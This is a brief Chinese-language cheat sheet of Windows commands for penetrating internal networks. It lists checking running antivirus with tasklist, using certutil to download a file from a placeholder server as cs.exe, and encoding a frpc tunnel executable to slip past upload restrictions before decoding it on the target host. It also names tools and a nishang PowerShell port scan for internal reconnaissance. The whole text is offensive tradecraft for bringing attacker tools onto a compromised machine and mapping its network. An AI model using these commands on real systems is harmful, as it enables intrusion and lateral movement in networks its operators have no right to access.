# Intranet Cmd

---

内网渗透常用cmd命令

```
tasklist /svc  # 查看杀软情况
certutil -urlcache -split -f https://xxxxxx cs.exe   # 下载文件输出cs.exe
```


bypass windows不能上传exe

```
本地把目标exe编码输出txt，挂到服务器上
CertUtil -encode frpc.exe frpc.txt
靶机把txt下载下来
certutil.exe -urlcache -split -f frpc.txt的地址
靶机将txt解码成exe
CertUtil -decode frpc.txt frpc.exe
```

内网扫描

```
蚁剑插件ladon
fscan
```
powershell 版内网扫描

```
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1
Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort
```
